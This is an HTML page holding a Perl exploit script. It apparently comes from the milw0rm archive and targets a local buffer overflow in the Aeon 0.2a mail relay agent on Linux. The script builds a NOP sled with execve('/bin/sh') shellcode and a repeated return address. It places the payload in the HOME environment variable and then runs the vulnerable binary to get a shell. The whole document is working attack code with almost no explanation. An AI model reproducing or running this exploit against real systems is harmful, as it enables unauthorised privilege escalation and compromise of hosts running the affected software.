<html><head><title>Aeon 0.2a Local Linux Exploit (perl code)</title></head><pre>#!/usr/bin/perl
#                       Aeon-mail relay agent for Linux                                   *
#                                                                                         *
#           written by lammat just for practice purposes                                  *
#                       tested against aeon-0.2a                                          *
#                       http://grpower.ath.cx		                                  *
#		          lammat@iname.com			                          *


#  execve(/bin/sh) for linux x86
#   29 bytes
#   by Matias Sedalo



$shellcode = 
&quot;\x31\xdb\x53\x8d\x43\x17\xcd\x80\x99\x68\x6e\x2f\x73\x68\x68&quot;.
&quot;\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;


$buf = 528; 
$ret = 0xbfffe122; 
$nop = &quot;\x90&quot;;

if (@ARGV == 1) {
$offset = $ARGV[0];
}

for ($i = 0; $i &lt; ($buf - length($shellcode) - 100); $i++) {
$buffer .= $nop;
}


$buffer .= $shellcode;


print(&quot;Address: 0x&quot;, sprintf('%lx',($ret + $offset)), &quot;\n&quot;);


$new_ret = pack('l', ($ret + $offset));

until (length($buffer) == $buf) {
$buffer .= $new_ret;
}

local($ENV{'HOME'}) = $buffer; exec(&quot;/home/lammat/aeon-0.2a/aeon $i&quot;);

# milw0rm.com [2005-04-05]</pre></html>